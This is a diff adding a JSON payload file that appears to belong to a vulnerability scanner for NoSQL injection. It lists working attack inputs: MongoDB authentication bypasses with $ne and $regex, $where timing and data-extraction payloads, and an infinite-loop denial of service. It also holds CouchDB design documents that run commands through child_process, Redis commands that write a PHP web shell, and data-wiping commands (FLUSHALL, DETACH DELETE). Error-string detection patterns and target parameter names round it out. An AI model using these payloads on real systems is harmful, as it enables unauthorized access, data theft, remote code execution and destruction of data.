@@ -1,0 +1,120 @@
+{
+  "info": {
+    "name": "NoSQL Injection Payloads",
+    "author": "CyberDyne Security",
+    "version": "2.0",
+    "description": "Comprehensive NoSQL injection payloads for MongoDB, CouchDB, Redis, Cassandra, Neo4j. Includes timing-based and blind detection. 2026 updated.",
+    "category": "Injection",
+    "severity": "CRITICAL",
+    "owasp": "A03:2021 - Injection"
+  },
+  "payloads": {
+    "mongodb_auth_bypass": [
+      {"payload": "{\"$ne\": null}", "description": "Not null bypass", "encoding": "json", "target": "body"},
+      {"payload": "{\"$ne\": \"\"}", "description": "Not empty bypass", "encoding": "json", "target": "body"},
+      {"payload": "{\"$gt\": \"\"}", "description": "Greater than empty", "encoding": "json", "target": "body"},
+      {"payload": "{\"$regex\": \".*\"}", "description": "Regex wildcard", "encoding": "json", "target": "body"},
+      {"payload": "{\"$where\": \"1==1\"}", "description": "Where injection", "encoding": "json", "target": "body"},
+      {"payload": "{\"$exists\": true}", "description": "Exists operator", "encoding": "json", "target": "body"},
+      {"payload": "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}", "description": "Full auth bypass", "encoding": "json", "target": "body"},
+      {"payload": "{\"$or\": [{\"username\": {\"$ne\": null}}, {\"password\": {\"$ne\": null}}]}", "description": "OR bypass", "encoding": "json", "target": "body"},
+      {"payload": "{\"username\": {\"$in\": []}, \"password\": {\"$ne\": \"\"}}", "description": "IN with empty array", "encoding": "json", "target": "body"},
+      {"payload": "{\"$nor\": [{\"username\": \"\"}]}", "description": "NOR bypass", "encoding": "json", "target": "body"}
+    ],
+    "mongodb_operator_injection": [
+      {"payload": "{\"$gt\": 0}", "description": "Greater than zero", "encoding": "json", "target": "body"},
+      {"payload": "{\"$lt\": 999999}", "description": "Less than large", "encoding": "json", "target": "body"},
+      {"payload": "{\"$gte\": 0}", "description": "Greater or equal zero", "encoding": "json", "target": "body"},
+      {"payload": "{\"$lte\": 999999}", "description": "Less or equal large", "encoding": "json", "target": "body"},
+      {"payload": "{\"$in\": [\"admin\", \"root\", \"user\"]}", "description": "IN operator bypass", "encoding": "json", "target": "body"},
+      {"payload": "{\"$nin\": [\"locked\", \"disabled\"]}", "description": "NOT IN bypass", "encoding": "json", "target": "body"},
+      {"payload": "{\"$all\": [\"admin\", \"user\"]}", "description": "ALL operator", "encoding": "json", "target": "body"},
+      {"payload": "{\"$size\": {\"$gt\": 0}}", "description": "SIZE operator", "encoding": "json", "target": "body"},
+      {"payload": "{\"$elemMatch\": {\"user\": \"admin\"}}", "description": "ELEMMATCH operator", "encoding": "json", "target": "body"},
+      {"payload": "{\"$not\": {\"locked\": true}}", "description": "NOT operator", "encoding": "json", "target": "body"}
+    ],
+    "mongodb_time_based": [
+      {"payload": "{\"$where\": \"sleep(5000)\"}", "description": "Sleep 5 seconds", "encoding": "json", "target": "body"},
+      {"payload": "{\"$where\": \"function(){sleep(5000); return true;}\"}", "description": "JS function sleep", "encoding": "json", "target": "body"},
+      {"payload": "{\"$where\": \"while(true){}\"}", "description": "Infinite loop DoS", "encoding": "json", "target": "body"},
+      {"payload": "{\"username\": {\"$regex\": \"^a\"}, \"password\": {\"$where\": \"sleep(1000)\"}}", "description": "Blind timing extraction", "encoding": "json", "target": "body"}
+    ],
+    "mongodb_data_extraction": [
+      {"payload": "{\"$where\": \"Object.keys(db.getCollectionNames())[0]\"}", "description": "List collections", "encoding": "json", "target": "body"},
+      {"payload": "{\"$where\": \"db.getCollection('users').findOne().toString()\"}", "description": "Extract user data", "encoding": "json", "target": "body"},
+      {"payload": "{\"$where\": \"db.getCollection('users').find().toString()\"}", "description": "List all users", "encoding": "json", "target": "body"},
+      {"payload": "{\"$where\": \"tojson(db.getCollection('admins').findOne())\"}", "description": "Extract admin data", "encoding": "json", "target": "body"}
+    ],
+    "couchdb_injection": [
+      {"payload": "{\"_id\": \"_design/shell\", \"views\": {\"exec\": {\"map\": \"function(doc) { emit(null, require('util').exec('id')); }\"}}}", "description": "CouchDB view injection", "encoding": "json", "target": "body"},
+      {"payload": "{\"_id\": \"_design/test\", \"views\": {\"x\": {\"map\": \"function(doc) { require('child_process').exec('id'); }\", \"reduce\": \"_count\"}}}", "description": "CouchDB RCE attempt", "encoding": "json", "target": "body"},
+      {"payload": "/_all_dbs", "description": "CouchDB list all databases", "encoding": "url", "target": "path"},
+      {"payload": "/_session", "description": "CouchDB session info", "encoding": "url", "target": "path"},
+      {"payload": "/_utils/", "description": "CouchDB Futon admin", "encoding": "url", "target": "path"}
+    ],
+    "redis_injection": [
+      {"payload": "CONFIG SET dir /tmp", "description": "Redis config dir change", "encoding": "raw", "target": "body"},
+      {"payload": "CONFIG SET dbfilename shell.php", "description": "Redis DB filename", "encoding": "raw", "target": "body"},
+      {"payload": "SET shell \"<?php system($_GET['c']); ?>\"", "description": "Redis shell write", "encoding": "raw", "target": "body"},
+      {"payload": "SAVE", "description": "Redis save DB", "encoding": "raw", "target": "body"},
+      {"payload": "GET shell", "description": "Redis read shell", "encoding": "raw", "target": "body"},
+      {"payload": "KEYS *", "description": "Redis list all keys", "encoding": "raw", "target": "body"},
+      {"payload": "INFO", "description": "Redis info", "encoding": "raw", "target": "body"},
+      {"payload": "FLUSHALL", "description": "Redis flush all", "encoding": "raw", "target": "body"},
+      {"payload": "CONFIG GET *", "description": "Redis get all config", "encoding": "raw", "target": "body"},
+      {"payload": "CLIENT LIST", "description": "Redis client list", "encoding": "raw", "target": "body"}
+    ],
+    "cassandra_injection": [
+      {"payload": "SELECT * FROM system_schema.keyspaces", "description": "Cassandra list keyspaces", "encoding": "raw", "target": "body"},
+      {"payload": "SELECT * FROM system.local", "description": "Cassandra local info", "encoding": "raw", "target": "body"},
+      {"payload": "SELECT * FROM system.peers", "description": "Cassandra peers", "encoding": "raw", "target": "body"},
+      {"payload": "SELECT * FROM users", "description": "Cassandra select users", "encoding": "raw", "target": "body"}
+    ],
+    "neo4j_injection": [
+      {"payload": "MATCH (n) RETURN n LIMIT 100", "description": "Neo4j match all nodes", "encoding": "raw", "target": "body"},
+      {"payload": "MATCH (n:User) RETURN n", "description": "Neo4j match users", "encoding": "raw", "target": "body"},
+      {"payload": "MATCH (n) DETACH DELETE n", "description": "Neo4j delete all", "encoding": "raw", "target": "body"},
+      {"payload": "CALL db.labels()", "description": "Neo4j list labels", "encoding": "raw", "target": "body"},
+      {"payload": "CALL db.propertyKeys()", "description": "Neo4j property keys", "encoding": "raw", "target": "body"}
+    ],
+    "elasticsearch_injection": [
+      {"payload": "/_cat/indices?v", "description": "ES list indices", "encoding": "url", "target": "path"},
+      {"payload": "/_cat/nodes?v", "description": "ES list nodes", "encoding": "url", "target": "path"},
+      {"payload": "/_cluster/health", "description": "ES cluster health", "encoding": "url", "target": "path"},
+      {"payload": "/_search?q=*", "description": "ES search all", "encoding": "url", "target": "path"}
+    ],
+    "url_param_injection": [
+      {"payload": "username[$ne]=null&password[$ne]=null", "description": "MongoDB URL param bypass", "encoding": "url", "target": "url_param"},
+      {"payload": "login[username][$ne]=&login[password][$ne]=", "description": "Nested MongoDB URL", "encoding": "url", "target": "url_param"},
+      {"payload": "user[$regex]=^admin&pass[$gt]=", "description": "Regex + gt URL param", "encoding": "url", "target": "url_param"},
+      {"payload": "filter[$where]=\"1==1\"", "description": "Where in URL", "encoding": "url", "target": "url_param"}
+    ]
+  },
+  "detection_patterns": {
+    "mongodb": [
+      "MongoError", "MongoServerError", "BSONError", "errmsg", "$err",
+      "not authorized", "failed to scan", "Invalid BSON", "duplicate key error"
+    ],
+    "couchdb": [
+      "couchdb", "badmatch", "function_clause", "undef", "_all_dbs"
+    ],
+    "redis": [
+      "-ERR", "unknown command", "MOVED", "ASK", "LOADING"
+    ],
+    "cassandra": [
+      "InvalidQueryException", "SyntaxError", "Unauthorized"
+    ],
+    "neo4j": [
+      "Neo.ClientError", "Neo.DatabaseError", "SyntaxError"
+    ]
+  },
+  "parameters": [
+    "username", "user", "login", "email", "password", "search", "query",
+    "filter", "id", "name", "document", "data", "json", "q", "find"
+  ],
+  "timing_thresholds": {
+    "mongodb_sleep": 5000,
+    "baseline_threshold": 2000,
+    "blind_extraction_delay": 1000
+  }
+}
